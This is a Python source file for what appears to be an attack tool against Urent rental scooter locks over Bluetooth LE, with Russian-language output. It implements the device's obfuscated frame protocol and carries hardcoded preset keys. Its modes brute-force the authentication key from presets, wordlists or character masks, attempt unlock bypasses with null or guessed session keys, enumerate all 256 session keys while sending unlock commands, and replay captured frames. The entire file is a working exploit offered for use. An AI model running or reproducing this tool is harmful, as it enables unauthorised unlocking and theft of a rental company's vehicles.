import argparse
import asyncio
import random
import sys

HEADER = b"\xA3\xA4"
RAND_OFFSET = 0x32
SERVICE_UUID = "6e400001-b5a3-f393-e0a9-e50e24dcca9e"
WRITE_UUID = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"
NOTIFY_UUID = "6e400003-b5a3-f393-e0a9-e50e24dcca9e"
CMD_KEY = 0x01
CMD_UNLOCK = 0x05
CMD_ERROR = 0x10
CMD_LOCK = 0x15
CMD_DEVICE_INFO = 0x31
PRESETS = ("4BKNwi77", "w4S3Hqn5")
CHARSET_DIGITS = "0123456789"
CHARSET_LOWER = "abcdefghijklmnopqrstuvwxyz"
CHARSET_UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
CHARSET_ALNUM = CHARSET_LOWER + CHARSET_UPPER + CHARSET_DIGITS
CHARSET_NAMES = {
    "digits": CHARSET_DIGITS,
    "lower": CHARSET_LOWER,
    "upper": CHARSET_UPPER,
    "alnum": CHARSET_ALNUM,
}


def crc8(data):
    crc = 0
    for value in data:
        crc ^= value
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0x8C
            else:
                crc >>= 1
    return crc & 0xFF


def build_frame(cmd, key, payload):
    rand0 = random.randint(1, 0xFE)
    rand = (rand0 + RAND_OFFSET) & 0xFF
    body = bytearray(HEADER)
    body.append(len(payload) & 0xFF)
    body.append(rand)
    body.append((key ^ rand0) & 0xFF)
    body.append((cmd ^ rand0) & 0xFF)
    for value in payload:
        body.append((value ^ rand0) & 0xFF)
    body.append(crc8(body))
    return bytes(body)


def parse_frame(data):
    if len(data) < 7 or data[0:2] != HEADER:
        return None
    length = data[2]
    if len(data) != length + 7:
        return None
    if crc8(data[:-1]) != data[-1]:
        return None
    rand = (data[3] - RAND_OFFSET) & 0xFF
    key = data[4] ^ rand
    cmd = data[5] ^ rand
    payload = bytes((value ^ rand) & 0xFF for value in data[6:6 + length])
    return cmd, key, rand, payload, data


def hex_bytes(data):
    return " ".join(f"{value:02X}" for value in data)


def resolve_charset(value):
    return CHARSET_NAMES.get(value.lower(), value)


def key_sequence(charset, length):
    alphabet = list(dict.fromkeys(charset))
    if not alphabet or length <= 0:
        return
    index = [0] * length
    while True:
        yield "".join(alphabet[position] for position in index)
        position = length - 1
        while position >= 0:
            index[position] += 1
            if index[position] < len(alphabet):
                break
            index[position] = 0
            position -= 1
        if position < 0:
            return


def key_sequence_count(charset, length):
    size = len(set(charset))
    if size == 0 or length <= 0:
        return 0
    return size ** length


def parse_wordlist(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        text = handle.read()
    seen = set()
    result = []
    for item in text.replace("\r", "\n").replace(",", "\n").replace(";", "\n").replace("\t", "\n").split("\n"):
        key = item.strip()
        if key and key not in seen:
            seen.add(key)
            result.append(key)
    return result


def build_candidates(args):
    seen = set()

    def fresh(key):
        if not key or key in seen:
            return False
        seen.add(key)
        return True

    for key in args.key or PRESETS:
        if fresh(key):
            yield key
    if args.wordlist:
        for key in parse_wordlist(args.wordlist):
            if fresh(key):
                yield key
    if args.mask:
        for key in key_sequence(resolve_charset(args.mask), args.length):
            if fresh(key):
                yield key


def unlock_payload():
    return bytes([1] * 10)


def unlock_timestamp_payload():
    import time
    seconds = int(time.time())
    return bytes([1, 0x31, 0x31, 0x32, 0x39]) + seconds.to_bytes(4, "big") + b"\x00"


class Probe:
    def __init__(self, client):
        self.client = client
        self.buffer = bytearray()
        self.frames = []
        self.event = asyncio.Event()

    async def start(self):
        await self.client.start_notify(NOTIFY_UUID, self.on_notify)

    async def stop(self):
        try:
            await self.client.stop_notify(NOTIFY_UUID)
        except Exception:
            pass

    def on_notify(self, _sender, data):
        self.buffer.extend(data)
        while len(self.buffer) >= 7:
            start = self.buffer.find(HEADER)
            if start < 0:
                self.buffer.clear()
                return
            if start:
                del self.buffer[:start]
            if len(self.buffer) < 3:
                return
            total = self.buffer[2] + 7
            if len(self.buffer) < total:
                return
            frame = parse_frame(bytes(self.buffer[:total]))
            if frame is None:
                del self.buffer[0]
                continue
            del self.buffer[:total]
            self.frames.append(frame)
            self.event.set()

    async def send(self, cmd, key, payload, label):
        frame = build_frame(cmd, key, payload)
        print(f"TX {label}: {hex_bytes(frame)}")
        await self.client.write_gatt_char(WRITE_UUID, frame, response=False)
        return frame

    async def wait_frame(self, timeout, predicate=None):
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout
        while True:
            while self.frames:
                frame = self.frames.pop(0)
                cmd, key, rand, payload, raw = frame
                print(f"RX cmd=0x{cmd:02X} key=0x{key:02X} rand=0x{rand:02X} payload={hex_bytes(payload)} frame={hex_bytes(raw)}")
                if predicate is None or predicate(frame):
                    return frame
            left = deadline - loop.time()
            if left <= 0:
                return None
            self.event.clear()
            try:
                await asyncio.wait_for(self.event.wait(), left)
            except asyncio.TimeoutError:
                return None

    async def drain(self, timeout):
        await asyncio.sleep(timeout)
        result = list(self.frames)
        self.frames.clear()
        for cmd, key, rand, payload, raw in result:
            print(f"RX cmd=0x{cmd:02X} key=0x{key:02X} rand=0x{rand:02X} payload={hex_bytes(payload)} frame={hex_bytes(raw)}")
        return result


async def find_device(address, name, timeout):
    from bleak import BleakScanner
    print("Сканирование BLE...")
    devices = await BleakScanner.discover(timeout=timeout)
    for device in devices:
        print(f"{device.address} {device.name or 'Unknown'} RSSI={device.rssi}")
    if address:
        for device in devices:
            if device.address.upper() == address.upper():
                return device
        return await BleakScanner.find_device_by_address(address, timeout=timeout)
    if name:
        for device in devices:
            if device.name and name.lower() in device.name.lower():
                return device
    return None


async def run(args):
    from bleak import BleakClient
    device = await find_device(args.address, args.name, args.timeout)
    if device is None:
        print("Устройство не найдено")
        return 1
    print(f"Подключение к {device.address} {device.name or ''}")
    async with BleakClient(device, timeout=args.timeout) as client:
        print(f"Подключено: {client.is_connected}")
        services = client.services
        found = services.get_characteristic(WRITE_UUID) if hasattr(services, "get_characteristic") else None
        if found is None:
            for service in services:
                for characteristic in service.characteristics:
                    print(f"char {characteristic.uuid} {characteristic.properties}")
        probe = Probe(client)
        await probe.start()
        try:
            if args.mode == "capture":
                await probe.drain(args.seconds)
            elif args.mode == "auth":
                total = None
                if args.mask:
                    charset = resolve_charset(args.mask)
                    total = key_sequence_count(charset, args.length)
                    print(f"Маска: {len(set(charset))} символов, длина {args.length}, всего {total}")
                if args.wordlist:
                    print(f"Словарь: {len(parse_wordlist(args.wordlist))} ключей из {args.wordlist}")
                tried = 0
                for key in build_candidates(args):
                    tried += 1
                    suffix = f" из {total}" if total is not None else ""
                    print(f"Проверка ключа {key} ({tried}{suffix})")
                    await probe.send(CMD_KEY, 0, key.encode("ascii"), f"key {key}")
                    frame = await probe.wait_frame(args.wait, lambda f: f[0] == CMD_KEY)
                    if frame and len(frame[3]) >= 2 and frame[3][0] == 1:
                        session = frame[3][1]
                        print(f"Ключ подошел: {key}, session=0x{session:02X}")
                        if args.unlock:
                            await probe.send(CMD_UNLOCK, session, unlock_payload(), "unlock")
                            await probe.wait_frame(args.wait)
                        return 0
                    if args.limit and tried >= args.limit:
                        print(f"Достигнут лимит {args.limit}")
                        break
                print("Ключи не подошли")
            elif args.mode == "bypass":
                variants = [
                    ("unlock 10x01 key=0", CMD_UNLOCK, 0, unlock_payload()),
                    ("unlock timestamp key=0", CMD_UNLOCK, 0, unlock_timestamp_payload()),
                    ("device info key=0", CMD_DEVICE_INFO, 0, b"\x01"),
                    ("unlock 10x01 key=0x42", CMD_UNLOCK, 0x42, unlock_payload()),
                ]
                for label, cmd, key, payload in variants:
                    await probe.send(cmd, key, payload, label)
                    await probe.wait_frame(args.wait)
            elif args.mode == "brute":
                for key in range(256):
                    await probe.send(CMD_UNLOCK, key, unlock_payload(), f"brute key=0x{key:02X}")
                    frames = await probe.drain(args.gap)
                    for cmd, _key, _rand, payload, _raw in frames:
                        if cmd in (CMD_UNLOCK, CMD_LOCK) and (not payload or payload[0] in (0, 1, 2)):
                            print(f"Возможный успех: key=0x{key:02X} cmd=0x{cmd:02X} payload={hex_bytes(payload)}")
                            return 0
                print("Перебор завершен без явного успеха")
            elif args.mode == "replay":
                for item in args.hex:
                    data = bytes.fromhex(item.replace(" ", "").replace(":", ""))
                    print(f"TX replay: {hex_bytes(data)}")
                    await client.write_gatt_char(WRITE_UUID, data, response=False)
                    await probe.wait_frame(args.wait)
            else:
                print(f"Неизвестный режим {args.mode}")
                return 2
        finally:
            await probe.stop()
    return 0


def main():
    parser = argparse.ArgumentParser(description="Urent BLE probe: auth, bypass, brute, replay, capture")
    parser.add_argument("--address", default="", help="BLE MAC или UUID")
    parser.add_argument("--name", default="", help="Фильтр по имени")
    parser.add_argument("--scan", action="store_true", help="Только сканирование")
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--wait", type=float, default=1.5)
    parser.add_argument("--gap", type=float, default=0.05)
    parser.add_argument("--seconds", type=float, default=30.0)
    parser.add_argument("--key", action="append", default=[], help="Ключ для режима auth")
    parser.add_argument("--wordlist", default="", help="Файл со словарем ключей для режима auth")
    parser.add_argument("--mask", default="", help="Символы маски или имя набора: digits, lower, upper, alnum")
    parser.add_argument("--length", type=int, default=4, help="Длина ключа для маски, 1..8")
    parser.add_argument("--limit", type=int, default=0, help="Максимум попыток, 0 без ограничения")
    parser.add_argument("--unlock", action="store_true", help="Unlock после успешного auth")
    parser.add_argument("--hex", action="append", default=[], help="Кадр для replay")
    parser.add_argument("--mode", choices=("auth", "bypass", "brute", "replay", "capture"), default="auth")
    args = parser.parse_args()
    if args.scan:
        from bleak import BleakScanner
        devices = asyncio.run(BleakScanner.discover(timeout=args.timeout))
        for device in devices:
            print(f"{device.address} {device.name or 'Unknown'} RSSI={device.rssi}")
        return 0
    if not 1 <= args.length <= 8:
        print("Длина ключа должна быть в диапазоне 1..8")
        return 2
    return asyncio.run(run(args))


if __name__ == "__main__":
    sys.exit(main())